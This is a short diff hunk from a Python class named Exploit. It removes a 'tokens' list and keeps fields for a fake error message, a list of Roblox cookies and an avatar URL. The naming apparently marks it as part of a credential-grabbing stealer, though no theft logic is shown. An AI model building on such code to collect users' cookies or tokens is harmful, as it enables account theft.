@@ -43,7 +43,6 @@ class Exploit:
         self.fakeerror = self.fetch_conf("fakeerror")
         self.fakeerrorcustom = self.fetch_conf("fakeerrorcustom")
         self.robloxcookies = []
-        self.tokens = []
         self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"
 
     def fetch_conf(self, e: str) -> Union[str, bool]:
